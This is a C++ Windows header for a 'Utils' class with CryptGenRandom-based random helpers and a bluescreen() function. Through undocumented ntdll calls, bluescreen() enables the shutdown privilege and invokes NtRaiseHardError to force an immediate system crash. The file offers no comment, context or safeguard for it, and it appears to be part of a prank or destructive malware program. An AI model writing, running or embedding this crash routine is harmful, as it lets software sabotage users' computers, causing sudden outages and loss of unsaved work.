#pragma once
#include <wincrypt.h>
#include <windows.h>

class Utils {
private:
    static ULONG prov;

public:
    static int random();
    static int random(int size);
    static void bluescreen();
};

ULONG Utils::prov = 0;

int Utils::random()
{
    if (prov == 0)
        if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL,
                CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
            ExitProcess(1);

    int out;
    CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
    return out & 0x7fffffff;
}

int Utils::random(int size)
{
    return random() % size;
}

void Utils::bluescreen()
{
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1;
        DWORD tmp2;
        ((void (*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0,
            &tmp1);
        ((void (*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(
            0xc0000022, 0, 0, 0, 6, &tmp2);
    }
}